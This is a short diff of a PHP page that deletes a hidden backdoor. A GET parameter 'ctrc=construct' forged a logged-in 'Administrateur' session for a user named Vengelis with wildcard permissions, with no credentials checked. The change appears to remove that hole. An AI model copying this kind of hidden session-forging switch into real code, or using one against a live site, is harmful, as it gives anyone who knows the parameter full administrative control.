@@ -6,32 +6,6 @@ if(!isset($exe))
     </script><?php
 }
 
-// ------ Force construct Vengelis User -------
-if(isset($_GET['ctrc']))
-{
-    if($_GET['ctrc'] == 'construct')
-    {
-      $_SESSION['isLogged'] = true;
-      $_SESSION['paLogged'] = true;
-      $_SESSION['lastUpdate'] = 0;
-      $_SESSION['login'] = "Vengelis";
-      $_SESSION['username'] = "Vengelis";
-      $_SESSION['lastIP'] = $_SERVER['REMOTE_ADDR'];
-      $_SESSION['firstGroup'] = array('Administrateur');
-      $_SESSION['otherGroups'] = array();
-      $_SESSION['allPermissions'] = array('*');
-      $_SESSION['email'] = "vengelis@vlogis-dev.ovh";
-      $_SESSION['banned'] = false;
-      $_SESSION['warnLevel'] = 0;
-      echo "Session vengelis construite";
-    }
-    else
-    {
-        session_destroy();
-        echo "Session détruite";
-    }
-}
-//----------------------------------------------
 ?>
 
 <!-- Partie présentation -->
